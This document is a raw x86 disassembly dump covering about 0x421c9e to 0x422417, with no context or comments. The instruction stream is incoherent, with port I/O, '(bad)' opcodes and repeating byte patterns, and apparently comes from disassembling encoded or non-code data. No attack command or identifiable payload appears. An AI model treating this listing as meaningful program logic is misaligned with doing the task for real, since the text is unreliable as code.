  421c9e:	jmp    0x421c8b
  421ca0:	in     al,dx
  421ca1:	pusha  
  421ca2:	cmp    esi,DWORD PTR [edi+0x79]
  421ca5:	pop    eax
  421ca6:	out    0xeb,al
  421ca8:	jmp    0x421d21
  421caa:	cmp    BYTE PTR [ecx-0x28],0xe6
  421cae:	jmp    0x421c9b
  421cb0:	ds ja  0x421d24
  421cb3:	pop    eax
  421cb4:	out    0xeb,al
  421cb6:	jmp    0x421d2f
  421cb8:	jns    0x421c3e
  421cba:	out    0xeb,al
  421cbc:	jmp    0x421cad
  421cbe:	cmp    BYTE PTR [ecx-0x70],dh
  421cc1:	cmp    eax,0xe7588177
  421cc6:	jmp    0x421cb3
  421cc8:	out    dx,eax
  421cc9:	and    DWORD PTR [eax-0x1a],0xd43eebeb
  421cd0:	(bad)  
  421cd1:	fsubp  st(3),st
  421cd3:	jmp    0x421d44
  421cd5:	mov    al,0xf8
  421cd7:	ja     0x421d4a
  421cd9:	pop    eax
  421cda:	out    0xeb,al
  421cdc:	jmp    0x421d55
  421cde:	jns    0x421d40
  421ce0:	out    0xeb,al
  421ce2:	jmp    0x421cd3
  421ce4:	js     0x421d57
  421ce6:	fsub   st,st(6)
  421ce8:	jmp    0x421cd5
  421cea:	jne    0x421d65
  421cec:	pusha  
  421ced:	out    0xeb,al
  421cef:	jmp    0x421cc8
  421cf1:	jne    0x421ca6
  421cf3:	jno    0x421d49
  421cf5:	out    0xeb,al
  421cf7:	jmp    0x421ce5
  421cf9:	in     al,dx
  421cfa:	in     al,dx
  421cfb:	in     al,dx
  421cfc:	ja     0x421c7f
  421cfe:	push   esp
  421cff:	out    0xeb,al
  421d01:	jmp    0x421d2a
  421d03:	and    DWORD PTR [eax],0xfbebebeb
  421d09:	outs   dx,DWORD PTR ds:[esi]
  421d0a:	fldlg2 
  421d0c:	in     al,dx
  421d0d:	in     al,dx
  421d0e:	mov    bl,0x71
  421d10:	push   eax
  421d11:	out    0xeb,al
  421d13:	jmp    0x421d01
  421d15:	in     al,dx
  421d16:	in     al,dx
  421d17:	in     al,dx
  421d18:	xlat   BYTE PTR ds:[ebx]
  421d19:	or     dh,BYTE PTR [edi+0x71]
  421d1c:	push   esp
  421d1d:	out    0xeb,al
  421d1f:	jmp    0x421d90
  421d21:	lods   al,BYTE PTR ds:[esi]
  421d22:	in     eax,dx
  421d23:	jne    0x421d96
  421d25:	push   esp
  421d26:	out    0xeb,al
  421d28:	jmp    0x421da1
  421d2a:	jns    0x421d7c
  421d2c:	out    0xeb,al
  421d2e:	jmp    0x421d9f
  421d30:	lods   eax,DWORD PTR ds:[esi]
  421d31:	in     eax,dx
  421d32:	jne    0x421dad
  421d34:	push   eax
  421d35:	out    0xeb,al
  421d37:	jmp    0x421db0
  421d39:	adc    DWORD PTR [eax-0x1a],0x4127ebeb
  421d40:	mov    eax,0xec9b6ffb
  421d45:	in     al,dx
  421d46:	in     al,dx
  421d47:	ja     0x421dba
  421d49:	push   esp
  421d4a:	out    0xeb,al
  421d4c:	jmp    0x421d75
  421d4e:	jno    0x421d70
  421d50:	jmp    0x421d3d
  421d52:	jmp    0x421d4f
  421d54:	outs   dx,DWORD PTR ds:[esi]
  421d55:	mov    esp,ebp
  421d57:	in     al,dx
  421d58:	in     al,dx
  421d59:	ja     0x421dd4
  421d5b:	pop    eax
  421d5c:	out    0xeb,eax
  421d5e:	jmp    0x421d4f
  421d60:	jns    0x421db6
  421d62:	out    0xeb,al
  421d64:	jmp    0x421d61
  421d66:	mov    ds:0x54811ffd,al
  421d6b:	out    0xeb,al
  421d6d:	jmp    0x421de6
  421d6f:	jno    0x421dc9
  421d71:	out    0xeb,eax
  421d73:	jmp    0x421d64
  421d75:	jno    0x421dcb
  421d77:	out    0xeb,al
  421d79:	jmp    0x421def
  421d7b:	cld    
  421d7c:	ja     0x421def
  421d7e:	push   eax
  421d7f:	out    0xeb,al
  421d81:	jmp    0x421da2
  421d83:	mov    esi,0xececeea5
  421d88:	in     al,dx
  421d89:	jecxz  0x421d68
  421d8b:	jno    0x421d4b
  421d8d:	popa   
  421d8e:	push   ds
  421d8f:	ja     0x421d12
  421d91:	pop    eax
  421d92:	out    0xeb,eax
  421d94:	jmp    0x421d85
  421d96:	adc    DWORD PTR [esi+eiz*8-0x15],0xeea2fbeb
  421d9e:	ja     0x421e19
  421da0:	push   eax
  421da1:	out    0xeb,al
  421da3:	jmp    0x421da0
  421da5:	mov    ds:0xefbcf940,al
  421daa:	jno    0x421dfc
  421dac:	out    0xeb,al
  421dae:	jmp    0x421d9f
  421db0:	mov    esp,0xe7587177
  421db5:	jmp    0x421da2
  421db7:	out    dx,eax
  421db8:	jno    0x421e0e
  421dba:	out    0xeb,al
  421dbc:	jmp    0x421e32
  421dbe:	cld    
  421dbf:	xlat   BYTE PTR ds:[ebx]
  421dc0:	sbb    al,0x77
  421dc2:	jns    0x421e1c
  421dc4:	out    0xeb,eax
  421dc6:	jmp    0x421db7
  421dc8:	jns    0x421e1e
  421dca:	out    0xeb,al
  421dcc:	jmp    0x421dc9
  421dce:	mov    ds:0x507177fd,al
  421dd3:	out    0xeb,al
  421dd5:	jmp    0x421dd2
  421dd7:	mov    ds:0xefbcf138,al
  421ddc:	jns    0x421e2e
  421dde:	out    0xeb,al
  421de0:	jmp    0x421df9
  421de2:	mov    ebp,0xe7587177
  421de7:	jmp    0x421dd4
  421de9:	out    dx,eax
  421dea:	jno    0x421e40
  421dec:	out    0xeb,al
  421dee:	jmp    0x421e64
  421df0:	cld    
  421df1:	aad    0x10
  421df3:	jmp    0x421de0
  421df5:	jmp    0x421dcc
  421df7:	in     eax,dx
  421df8:	jmp    0x421de5
  421dfa:	jmp    0x421e73
  421dfc:	jns    0x421d82
  421dfe:	out    0xeb,al
  421e00:	jmp    0x421e77
  421e02:	jns    0x421e1c
  421e04:	jmp    0x421df1
  421e06:	jmp    0x421e7f
  421e08:	sbb    DWORD PTR [eax],0x77ebebeb
  421e0e:	jno    0x421d94
  421e10:	out    0xeb,al
  421e12:	jmp    0x421e03
  421e14:	sub    BYTE PTR cs:[ebp+0x71],dh
  421e18:	fs call 0x79ba0a09
  421e1e:	fs call 0x3dba0a0f
  421e24:	cmp    al,0x75
  421e26:	sub    DWORD PTR [eax-0x18],0x71b2ebeb
  421e2d:	test   al,ch
  421e2f:	jmp    0x421e1c
  421e31:	in     al,dx
  421e32:	mov    dl,0x71
  421e34:	test   eax,ebp
  421e36:	jmp    0x421e23
  421e38:	in     al,dx
  421e39:	mov    dl,0x71
  421e3b:	xchg   al,ch
  421e3d:	jmp    0x421e2a
  421e3f:	in     al,dx
  421e40:	mov    dl,0x71
  421e42:	xchg   eax,ebp
  421e44:	jmp    0x421e31
  421e46:	in     al,dx
  421e47:	jns    0x421eba
  421e49:	test   al,ch
  421e4b:	jmp    0x421e38
  421e4d:	cmp    al,0x56
  421e4f:	sub    al,0x77
  421e51:	jns    0x421eb7
  421e53:	call   0x3dba0a43
  421e58:	cmp    al,0x3e
  421e5a:	ja     0x421ecd
  421e5c:	test   dh,ah
  421e5e:	jmp    0x421e4b
  421e60:	cmp    al,0xeb
  421e62:	sbb    eax,0x77ebebe8
  421e68:	jno    0x421ed2
  421e6a:	call   0x71ba0a5a
  421e6f:	test   dh,ah
  421e71:	jmp    0x421e5e
  421e73:	mov    bl,0x71
  421e75:	dec    esp
  421e76:	out    0xeb,al
  421e78:	jmp    0x421e66
  421e7a:	in     al,dx
  421e7b:	in     al,dx
  421e7c:	in     al,dx
  421e7d:	xlat   BYTE PTR ds:[ebx]
  421e7e:	sti    
  421e7f:	ja     0x421efa
  421e81:	dec    esp
  421e82:	out    0xeb,al
  421e84:	jmp    0x421ef5
  421e86:	lods   eax,DWORD PTR ds:[esi]
  421e87:	in     eax,dx
  421e88:	jne    0x421f03
  421e8a:	dec    esp
  421e8b:	out    0xeb,al
  421e8d:	jmp    0x421f06
  421e8f:	or     DWORD PTR [esi+eiz*8-0x15],0x688127eb
  421e97:	call   0xfda20a87
  421e9c:	ja     0x421f0f
  421e9e:	test   dh,ah
  421ea0:	jmp    0x421e8d
  421ea2:	out    dx,eax
  421ea3:	jno    0x421ef1
  421ea5:	out    0xeb,al
  421ea7:	jmp    0x421e5b
  421ea9:	in     al,dx
  421eaa:	in     al,dx
  421eab:	xlat   BYTE PTR ds:[ebx]
  421eac:	mov    esi,0xe7587977
  421eb1:	jmp    0x421e9e
  421eb3:	jne    0x421f2e
  421eb5:	sbb    bl,ch
  421eb7:	jmp    0x421ea4
  421eb9:	ja     0x421e3c
  421ebb:	sbb    bl,ch
  421ebd:	jmp    0x421eaa
  421ebf:	ja     0x421f32
  421ec1:	pop    eax
  421ec2:	out    0xeb,eax
  421ec4:	jmp    0x421eb5
  421ec6:	sub    BYTE PTR cs:[ebp+0x71],dh
  421eca:	fs call 0x79ba0abb
  421ed0:	fs call 0x3dba0ac1
  421ed6:	inc    eax
  421ed7:	ds ja  0x421f4b
  421eda:	pop    eax
  421edb:	out    0xeb,eax
  421edd:	jmp    0x421f1b
  421edf:	ja     0x421f5a
  421ee1:	test   dh,ah
  421ee3:	jmp    0x421ed0
  421ee5:	cmp    eax,0xebdbe7d4
  421eea:	jmp    0x421f5b
  421eec:	mov    al,0xf8
  421eee:	ja     0x421e71
  421ef0:	fs call 0x2eba0ae1
  421ef6:	and    BYTE PTR [edi+0x79],dh
  421ef9:	fs call 0x2e320aea
  421eff:	adc    al,0x75
  421f01:	jno    0x421f1f
  421f03:	jmp    0x421ef0
  421f05:	jmp    0x421f7e
  421f07:	and    DWORD PTR [eax+ebp*8-0x15],0x687177eb
  421f0f:	call   0x2eb80aff
  421f14:	cmp    al,0xb3
  421f16:	xor    eax,ebp
  421f18:	in     al,dx
  421f19:	in     al,dx
  421f1a:	in     al,dx
  421f1b:	in     al,dx
  421f1c:	mov    bl,0x71
  421f1e:	mov    eax,0xecebebe7
  421f23:	in     al,dx
  421f24:	in     al,dx
  421f25:	in     al,dx
  421f26:	mov    bl,0x71
  421f28:	shl    dh,1
  421f2a:	jmp    0x421f17
  421f2c:	in     al,dx
  421f2d:	in     al,dx
  421f2e:	in     al,dx
  421f2f:	in     al,dx
  421f30:	mov    bl,0x71
  421f32:	dec    eax
  421f33:	out    0xeb,al
  421f35:	jmp    0x421f23
  421f37:	in     al,dx
  421f38:	in     al,dx
  421f39:	in     al,dx
  421f3a:	xlat   BYTE PTR ds:[ebx]
  421f3b:	sti    
  421f3c:	ja     0x421fb7
  421f3e:	dec    eax
  421f3f:	out    0xeb,al
  421f41:	jmp    0x421fb2
  421f43:	lods   eax,DWORD PTR ds:[esi]
  421f44:	in     eax,dx
  421f45:	jne    0x421fc0
  421f47:	dec    eax
  421f48:	out    0xeb,al
  421f4a:	jmp    0x421fc3
  421f4c:	and    DWORD PTR [eax+ebp*8-0x15],0x2ea3fbeb
  421f54:	repnz and eax,0xebe64871
  421f5a:	jmp    0x421f57
  421f5c:	outs   dx,DWORD PTR ds:[esi]
  421f5d:	mov    eax,ds:0x77ececec
  421f62:	jns    0x421fac
  421f64:	out    0xeb,al
  421f66:	jmp    0x421fbf
  421f68:	mov    ch,0x14
  421f6a:	ja     0x421eed
  421f6c:	fs call 0x70ba0b5d
  421f72:	imul   ah
  421f74:	in     eax,dx
  421f75:	in     al,dx
  421f76:	in     al,dx
  421f77:	jne    0x421faa
  421f79:	call   0xe68a98f5
  421f7e:	jmp    0x421f6b
  421f80:	push   edi
  421f81:	mov    ch,0x14
  421f83:	ja     0x421f06
  421f85:	fs call 0x70ba0b76
  421f8b:	div    al
  421f8d:	in     eax,dx
  421f8e:	in     al,dx
  421f8f:	in     al,dx
  421f90:	jne    0x422003
  421f92:	shl    dh,1
  421f94:	jmp    0x421f81
  421f96:	ja     0x422011
  421f98:	dec    eax
  421f99:	out    0xeb,al
  421f9b:	jmp    0x421ff4
  421f9d:	mov    ch,0x14
  421f9f:	ja     0x421f22
  421fa1:	fs call 0x70ba0b92
  421fa7:	div    ah
  421fa9:	in     eax,dx
  421faa:	in     al,dx
  421fab:	in     al,dx
  421fac:	jne    0x42201f
  421fae:	mov    eax,0x6febebe7
  421fb3:	test   eax,0xebebe7b8
  421fb8:	in     al,dx
  421fb9:	bound  eax,QWORD PTR [eax]
  421fbb:	ja     0x421ff6
  421fbd:	call   0xe7fa98e9
  421fc2:	jmp    0x421faf
  421fc4:	pop    edi
  421fc5:	cmc    
  421fc6:	ja     0x421f49
  421fc8:	mov    eax,0x75ebebe7
  421fcd:	inc    ecx
  421fce:	call   0xe7fac942
  421fd3:	jmp    0x421fc0
  421fd5:	in     al,dx
  421fd6:	bound  esp,QWORD PTR ds:0xe7b87177
  421fdc:	jmp    0x421fc9
  421fde:	cmp    al,0x77
  421fe0:	jns    0x42202a
  421fe2:	out    0xeb,al
  421fe4:	jmp    0x42203d
  421fe6:	mov    ch,0x14
  421fe8:	ja     0x421f6b
  421fea:	fs call 0x71ba0bdb
  421ff0:	pop    eax
  421ff1:	out    0xeb,eax
  421ff3:	jmp    0x421fe4
  421ff5:	jo     0x421fed
  421ff7:	clc    
  421ff8:	in     eax,dx
  421ff9:	in     al,dx
  421ffa:	in     al,dx
  421ffb:	cmp    al,0x77
  421ffd:	jns    0x421f83
  421fff:	out    0xeb,al
  422001:	jmp    0x421ff2
  422003:	jns    0x421fd5
  422005:	out    0xeb,al
  422007:	jmp    0x422046
  422009:	aam    0xc4
  42200b:	(bad)  
  42200d:	jmp    0x42207e
  42200f:	mov    al,0xf8
  422011:	aad    0x12
  422013:	jmp    0x422000
  422015:	jmp    0x42208e
  422017:	add    DWORD PTR [esi+eiz*8-0x7e8a1415],0xebebeb18
  422022:	ja     0x422095
  422024:	sbb    bl,ch
  422026:	jmp    0x422013
  422028:	ja     0x4220a3
  42202a:	test   dh,ah
  42202c:	jmp    0x422019
  42202e:	out    dx,eax
  42202f:	xor    al,0x28
  422031:	jne    0x4220ac
  422033:	fs call 0x81ba0c24
  422039:	fs call 0x71ba0c2a
  42203f:	test   dh,ah
  422041:	jmp    0x42202e
  422043:	out    dx,eax
  422044:	outs   dx,BYTE PTR ds:[esi]
  422045:	ins    BYTE PTR es:[edi],dx
  422046:	in     al,dx
  422047:	in     al,dx
  422048:	in     al,dx
  422049:	jne    0x4220bc
  42204b:	push   esp
  42204c:	out    0xeb,eax
  42204e:	jmp    0x4220c7
  422050:	jns    0x4220b6
  422052:	call   0xa5b20c42
  422057:	jo     0x422045
  422059:	in     al,dx
  42205a:	in     al,dx
  42205b:	in     al,dx
  42205c:	popa   
  42205d:	div    BYTE PTR [ebx-0x1418ab8f]
  422063:	jmp    0x422051
  422065:	in     al,dx
  422066:	in     al,dx
  422067:	in     al,dx
  422068:	mov    bl,0x71
  42206a:	aam    0xe6
  42206c:	jmp    0x422059
  42206e:	in     al,dx
  42206f:	in     al,dx
  422070:	in     al,dx
  422071:	in     al,dx
  422072:	mov    bl,0x71
  422074:	sbb    bh,ah
  422076:	jmp    0x422063
  422078:	in     al,dx
  422079:	in     al,dx
  42207a:	in     al,dx
  42207b:	in     al,dx
  42207c:	mov    bl,0x31
  42207e:	sub    ah,0xec
  422081:	in     al,dx
  422082:	in     al,dx
  422083:	mov    bl,0x71
  422085:	cmp    al,0xeb
  422087:	jmp    0x422074
  422089:	in     al,dx
  42208a:	in     al,dx
  42208b:	in     al,dx
  42208c:	in     al,dx
  42208d:	push   esp
  42208e:	in     al,dx
  42208f:	ins    BYTE PTR es:[edi],dx
  422090:	in     al,dx
  422091:	in     al,dx
  422092:	push   esi
  422093:	in     al,dx
  422094:	ja     0x422017
  422096:	pop    eax
  422097:	out    0xeb,eax
  422099:	jmp    0x4220d9
  42209b:	jmp    0x42201e
  42209d:	dec    eax
  42209e:	out    0xeb,eax
  4220a0:	jmp    0x422111
  4220a2:	test   eax,0xebebe754
  4220a7:	in     al,dx
  4220a8:	sti    
  4220a9:	jo     0x422119
  4220ab:	in     eax,dx
  4220ac:	in     al,dx
  4220ad:	in     al,dx
  4220ae:	ja     0x422121
  4220b0:	push   esp
  4220b1:	out    0xeb,eax
  4220b3:	jmp    0x422124
  4220b5:	fs clc 
  4220b7:	in     al,dx
  4220b8:	sti    
  4220b9:	jo     0x422119
  4220bb:	in     eax,dx
  4220bc:	in     al,dx
  4220bd:	in     al,dx
  4220be:	ja     0x422139
  4220c0:	push   esp
  4220c1:	out    0xeb,eax
  4220c3:	jmp    0x42213c
  4220c5:	add    DWORD PTR [esi+eiz*8+0x3defebeb],0xcc8175f8
  4220d0:	call   0x71ba0cc0
  4220d5:	int3   
  4220d6:	call   0xeb7f0cc6
  4220db:	inc    ecx
  4220dc:	test   BYTE PTR [ebp+0x71],dh
  4220df:	aam    0xe6
  4220e1:	jmp    0x4220ce
  4220e3:	outs   dx,DWORD PTR ds:[esi]
  4220e4:	test   eax,0xebebe6d4
  4220e9:	in     al,dx
  4220ea:	popa   
  4220eb:	push   DWORD PTR [edi+0x79]
  4220ee:	int3   
  4220ef:	call   0xeb800cdf
  4220f4:	xor    DWORD PTR [eax],0x75ebebe7
  4220fa:	jno    0x4220d0
  4220fc:	out    0xeb,al
  4220fe:	jmp    0x42216f
  422100:	test   eax,0xebebe6d4
  422105:	in     al,dx
  422106:	pusha  
  422107:	and    dh,BYTE PTR [edi-0x7f]
  42210a:	push   esp
  42210b:	out    0xeb,eax
  42210d:	jmp    0x42217e
  42210f:	es in  al,dx
  422111:	popa   
  422112:	add    esi,DWORD PTR [edi+0x71]
  422115:	push   esp
  422116:	out    0xeb,eax
  422118:	jmp    0x422191
  42211a:	jns    0x4220a0
  42211c:	out    0xeb,al
  42211e:	jmp    0x42210f
  422120:	xor    al,0xfc
  422122:	jne    0x42219d
  422124:	sbb    bh,ah
  422126:	jmp    0x422113
  422128:	xlat   BYTE PTR ds:[ebx]
  422129:	add    BYTE PTR [edi-0x7f],dh
  42212c:	push   esp
  42212d:	out    0xeb,eax
  42212f:	jmp    0x4221a8
  422131:	jno    0x4220b7
  422133:	out    0xeb,al
  422135:	jmp    0x422126
  422137:	out    dx,al
  422138:	jne    0x4221ab
  42213a:	sbb    bh,ah
  42213c:	jmp    0x422129
  42213e:	mov    bl,0x31
  422140:	sub    ah,0xec
  422143:	in     al,dx
  422144:	in     al,dx
  422145:	ja     0x4221c0
  422147:	sbb    bh,ah
  422149:	jmp    0x422136
  42214b:	outs   dx,DWORD PTR ds:[esi]
  42214c:	and    eax,0xb470fbec
  422151:	in     al,dx
  422152:	in     al,dx
  422153:	in     al,dx
  422154:	ja     0x4220d7
  422156:	sbb    bh,ah
  422158:	jmp    0x422145
  42215a:	ja     0x4221cd
  42215c:	test   dh,ah
  42215e:	jmp    0x42214b
  422160:	out    dx,eax
  422161:	out    dx,al
  422162:	jne    0x4221d5
  422164:	push   eax
  422165:	out    0xeb,eax
  422167:	jmp    0x4221d8
  422169:	test   eax,0xebebe750
  42216e:	in     al,dx
  42216f:	pusha  
  422170:	dec    eax
  422171:	ja     0x4221ec
  422173:	push   eax
  422174:	out    0xeb,eax
  422176:	jmp    0x4221e5
  422178:	int    0xec
  42217a:	in     al,dx
  42217b:	in     al,dx
  42217c:	ins    BYTE PTR es:[edi],dx
  42217d:	ins    DWORD PTR es:[edi],dx
  42217e:	in     eax,0xec
  422180:	in     al,dx
  422181:	in     al,dx
  422182:	ins    BYTE PTR es:[edi],dx
  422183:	pusha  
  422184:	or     esi,DWORD PTR [edi-0x7f]
  422187:	push   eax
  422188:	out    0xeb,eax
  42218a:	jmp    0x4221fb
  42218c:	scas   al,BYTE PTR es:[edi]
  42218d:	out    dx,al
  42218e:	ds ja  0x422202
  422191:	aam    0xe6
  422193:	jmp    0x422180
  422195:	cmp    al,0xeb
  422197:	add    DWORD PTR [edi+eiz*8-0x15],0x3c7175eb
  42219f:	jmp    0x42218c
  4221a1:	jmp    0x42217a
  4221a3:	adc    eax,0x50797752
  4221a8:	out    0xeb,eax
  4221aa:	jmp    0x4221fe
  4221ac:	jne    0x422227
  4221ae:	inc    esp
  4221af:	out    0xeb,al
  4221b1:	jmp    0x4221ae
  4221b3:	mov    ds:0xebe64481,eax
  4221b8:	jmp    0x4221f8
  4221ba:	ja     0x42222d
  4221bc:	aam    0xe6
  4221be:	jmp    0x4221ab
  4221c0:	cmp    al,0xeb
  4221c2:	add    DWORD PTR [edi+eiz*8-0x15],0x3c7175eb
  4221ca:	jmp    0x4221b7
  4221cc:	jmp    0x422245
  4221ce:	jns    0x422224
  4221d0:	out    0xeb,eax
  4221d2:	jmp    0x422243
  4221d4:	gs cld 
  4221d6:	in     al,dx
  4221d7:	pusha  
  4221d8:	adc    dh,BYTE PTR [edi-0x7f]
  4221db:	push   esp
  4221dc:	out    0xeb,eax
  4221de:	jmp    0x422257
  4221e0:	jno    0x422166
  4221e2:	out    0xeb,al
  4221e4:	jmp    0x4221d5
  4221e6:	cs cld 
  4221e8:	out    dx,eax
  4221e9:	xor    DWORD PTR [eax-0x19bf8e8b],eax
  4221ef:	jmp    0x4221dc
  4221f1:	ja     0x42226c
  4221f3:	inc    eax
  4221f4:	out    0xeb,al
  4221f6:	jmp    0x42226f
  4221f8:	cmp    DWORD PTR [ebx+ebp*8],0xfd75ebeb
  4221ff:	ja     0x422232
  422201:	sub    BYTE PTR [edi-0x54],0xf0
  422205:	jne    0x422238
  422207:	xor    BYTE PTR [edi+0x79],0x18
  42220b:	out    0xeb,eax
  42220d:	jmp    0x42227e
  42220f:	lods   eax,DWORD PTR ds:[esi]
  422210:	lock jne 0x42228c
  422213:	sbb    bh,ah
  422215:	jmp    0x422202
  422217:	aad    0x15
  422219:	jmp    0x422206
  42221b:	jmp    0x422294
  42221d:	adc    DWORD PTR [edi+eiz*8-0x15],0xae6feb
  422225:	jne    0x4221a8
  422227:	push   esp
  422228:	out    0xeb,eax
  42222a:	jmp    0x422201
  42222c:	push   0xffffffea
  42222e:	jmp    0x42221b
  422230:	ja     0x4222a3
  422232:	fs call 0x79ba0e23
  422238:	test   dh,ah
  42223a:	jmp    0x422227
  42223c:	out    dx,eax
  42223d:	je     0x4221ef
  42223f:	in     al,dx
  422240:	in     al,dx
  422241:	in     al,dx
  422242:	jno    0x4221f9
  422244:	sti    
  422245:	jb     0x422250
  422247:	icebp  
  422248:	in     al,dx
  422249:	in     al,dx
  42224a:	mov    dl,0x71
  42224c:	mov    esi,fs
  42224e:	jmp    0x42223b
  422250:	xor    esi,DWORD PTR [edx-0x1419728f]
  422256:	jmp    0x4222a9
  422258:	mov    dl,0x71
  42225a:	mov    fs,esi
  42225c:	jmp    0x422249
  42225e:	pusha  
  42225f:	mov    dl,0x71
  422261:	(bad)  
  422262:	out    0xeb,al
  422264:	jmp    0x4222a8
  422266:	mov    dl,0x71
  422268:	nop
  422269:	out    0xeb,al
  42226b:	jmp    0x4222be
  42226d:	mov    dl,0x71
  42226f:	xchg   ecx,eax
  422270:	out    0xeb,al
  422272:	jmp    0x4222d2
  422274:	mov    dl,0x71
  422276:	xchg   edx,eax
  422277:	out    0xeb,al
  422279:	jmp    0x4222da
  42227b:	mov    dl,0x71
  42227d:	xchg   ebx,eax
  42227e:	out    0xeb,al
  422280:	jmp    0x4222d7
  422282:	mov    dl,0x71
  422284:	xchg   esp,eax
  422285:	out    0xeb,al
  422287:	jmp    0x4222e4
  422289:	mov    dl,0x71
  42228b:	xchg   ebp,eax
  42228c:	out    0xeb,al
  42228e:	jmp    0x4222ea
  422290:	mov    dl,0x71
  422292:	xchg   esi,eax
  422293:	out    0xeb,al
  422295:	jmp    0x4222c8
  422297:	mov    dl,0x71
  422299:	xchg   edi,eax
  42229a:	out    0xeb,al
  42229c:	jmp    0x422302
  42229e:	mov    dl,0x71
  4222a0:	cwde   
  4222a1:	out    0xeb,al
  4222a3:	jmp    0x4222d2
  4222a5:	mov    dl,0x71
  4222a7:	cdq    
  4222a8:	out    0xeb,al
  4222aa:	jmp    0x422298
  4222ac:	jns    0x42222f
  4222ae:	mov    esi,fs
  4222b0:	jmp    0x42229d
  4222b2:	ds ja  0x422326
  4222b5:	inc    eax
  4222b6:	jmp    0x4222a3
  4222b8:	jmp    0x4222f6
  4222ba:	jmp    0x42223d
  4222bc:	inc    esp
  4222bd:	out    0xeb,eax
  4222bf:	jmp    0x422336
  4222c1:	jno    0x42232f
  4222c3:	call   0x71f60eb3
  4222c8:	mov    esp,0x88ebebe7
  4222cd:	in     al,dx
  4222ce:	in     al,dx
  4222cf:	in     al,dx
  4222d0:	jns    0x42234b
  4222d2:	mov    esp,0x3debebe7
  4222d7:	jmp    0x42225a
  4222d9:	ins    BYTE PTR es:[edi],dx
  4222da:	call   0x71f50eca
  4222df:	test   al,ch
  4222e1:	jmp    0x4222ce
  4222e3:	pop    edx
  4222e4:	mov    dl,0x71
  4222e6:	test   eax,ebp
  4222e8:	jmp    0x4222d5
  4222ea:	pusha  
  4222eb:	mov    dl,0x71
  4222ed:	xchg   al,ch
  4222ef:	jmp    0x4222dc
  4222f1:	push   eax
  4222f2:	mov    dl,0x71
  4222f4:	xchg   eax,ebp
  4222f6:	jmp    0x4222e3
  4222f8:	pop    eax
  4222f9:	mov    dl,0x71
  4222fb:	mov    al,ch
  4222fd:	jmp    0x4222ea
  4222ff:	pop    eax
  422300:	mov    dl,0x71
  422302:	mov    eax,ebp
  422304:	jmp    0x4222f1
  422306:	sbb    dh,BYTE PTR [edx-0x1417758f]
  42230c:	jmp    0x42235e
  42230e:	mov    dl,0x71
  422310:	mov    ebp,eax
  422312:	jmp    0x4222ff
  422314:	pop    eax
  422315:	mov    dl,0x71
  422317:	mov    eax,gs
  422319:	jmp    0x422306
  42231b:	pop    eax
  42231c:	mov    dl,0x71
  42231e:	(bad)  
  42231f:	call   0x7a2f0f0f
  422324:	add    DWORD PTR [eax+ebp*8-0x14c11415],0x71758441
  42232f:	test   dh,ah
  422331:	jmp    0x42231e
  422333:	mov    dl,0x71
  422335:	mov    esi,fs
  422337:	jmp    0x422324
  422339:	ds mov dl,0x71
  42233c:	(bad)  
  42233d:	out    0xeb,al
  42233f:	jmp    0x4223a1
  422341:	mov    dl,0x71
  422343:	mov    fs,esi
  422345:	jmp    0x422332
  422347:	pop    eax
  422348:	mov    dl,0x71
  42234a:	(bad)  
  42234b:	out    0xeb,al
  42234d:	jmp    0x422384
  42234f:	mov    dl,0x71
  422351:	nop
  422352:	out    0xeb,al
  422354:	jmp    0x4223af
  422356:	mov    dl,0x71
  422358:	xchg   ecx,eax
  422359:	out    0xeb,al
  42235b:	jmp    0x4223aa
  42235d:	mov    dl,0x71
  42235f:	xchg   edx,eax
  422360:	out    0xeb,al
  422362:	jmp    0x4223b7
  422364:	mov    dl,0x71
  422366:	xchg   ebx,eax
  422367:	out    0xeb,al
  422369:	jmp    0x4223bc
  42236b:	mov    dl,0x71
  42236d:	xchg   esp,eax
  42236e:	out    0xeb,al
  422370:	jmp    0x4223a2
  422372:	mov    dl,0x71
  422374:	xchg   ebp,eax
  422375:	out    0xeb,al
  422377:	jmp    0x4223ce
  422379:	mov    dl,0x71
  42237b:	xchg   esi,eax
  42237c:	out    0xeb,al
  42237e:	jmp    0x4223de
  422380:	mov    dl,0x71
  422382:	xchg   edi,eax
  422383:	out    0xeb,al
  422385:	jmp    0x4223d8
  422387:	mov    dl,0x71
  422389:	cwde   
  42238a:	out    0xeb,al
  42238c:	jmp    0x4223dd
  42238e:	mov    dl,0x71
  422390:	cdq    
  422391:	out    0xeb,al
  422393:	jmp    0x4223f5
  422395:	mov    dl,0x71
  422397:	call   0x71b2:0x5bebebe6
  42239e:	fwait
  42239f:	out    0xeb,al
  4223a1:	jmp    0x422401
  4223a3:	mov    dl,0x71
  4223a5:	pushf  
  4223a6:	out    0xeb,al
  4223a8:	jmp    0x42240f
  4223aa:	mov    dl,0x71
  4223ac:	popf   
  4223ad:	out    0xeb,al
  4223af:	jmp    0x4223e2
  4223b1:	mov    dl,0x71
  4223b3:	sahf   
  4223b4:	out    0xeb,al
  4223b6:	jmp    0x422412
  4223b8:	mov    dl,0x71
  4223ba:	lahf   
  4223bb:	out    0xeb,al
  4223bd:	jmp    0x42241f
  4223bf:	mov    dl,0x71
  4223c1:	mov    al,ds:0x5eebebe6
  4223c6:	mov    dl,0x71
  4223c8:	mov    eax,ds:0x65ebebe6
  4223cd:	mov    dl,0x71
  4223cf:	mov    ds:0x40ebebe6,al
  4223d4:	mov    dl,0x71
  4223d6:	mov    ds:0x5bebebe6,eax
  4223db:	mov    dl,0x71
  4223dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223de:	out    0xeb,al
  4223e0:	jmp    0x422412
  4223e2:	mov    dl,0x71
  4223e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223e5:	out    0xeb,al
  4223e7:	jmp    0x422436
  4223e9:	mov    dl,0x71
  4223eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223ec:	out    0xeb,al
  4223ee:	jmp    0x422450
  4223f0:	mov    dl,0x71
  4223f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223f3:	out    0xeb,al
  4223f5:	jmp    0x422444
  4223f7:	mov    dl,0x71
  4223f9:	test   al,0xe6
  4223fb:	jmp    0x4223e8
  4223fd:	in     al,dx
  4223fe:	jns    0x422471
  422400:	mov    esi,fs
  422402:	jmp    0x4223ef
  422404:	cmp    al,0x77
  422406:	jns    0x42238c
  422408:	out    0xeb,al
  42240a:	jmp    0x422449
  42240c:	jmp    0x42238f
  42240e:	inc    esp
  42240f:	out    0xeb,eax
  422411:	jmp    0x422488
  422413:	jno    0x422459
  422415:	jmp    0x422402
  422417:	jmp    0x422490
